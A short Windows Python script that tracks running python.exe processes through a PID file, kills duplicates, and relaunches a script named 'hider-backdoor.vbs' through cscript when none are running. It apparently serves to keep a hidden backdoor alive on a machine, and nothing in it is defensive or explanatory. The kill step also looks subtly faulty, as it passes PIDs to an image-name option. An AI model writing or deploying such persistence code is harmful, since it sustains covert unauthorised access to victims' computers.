import subprocess
import os
import shutil

curdir = os.path.dirname(os.path.realpath(__file__)).replace('\\','/')+'/'
usp = os.environ['USERPROFILE'].replace('\\','/')+'/'
f = open(curdir+'PID.txt', 'r', encoding='utf-8').readlines()
avd = []
rm = []

for i in f:
    command = 'tasklist /FI "PID eq %s" /FI "IMAGENAME eq python.exe"'%i.replace('\n','')
    out = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode()
    if out != 'INFO: No tasks are running which match the specified criteria.\r\n':
        avd.append(i)

if len(avd) > 1:
    for i in avd[1:]:
        command = 'taskkill /f /im %s'%i
        subprocess.Popen(command, shell=True)
    with open(curdir+'PID.txt', 'w') as fout:
        fout.write(avd[0])
elif len(avd) == 0:
    command = 'cscript hider-backdoor.vbs'
    subprocess.Popen(command, cwd=curdir)
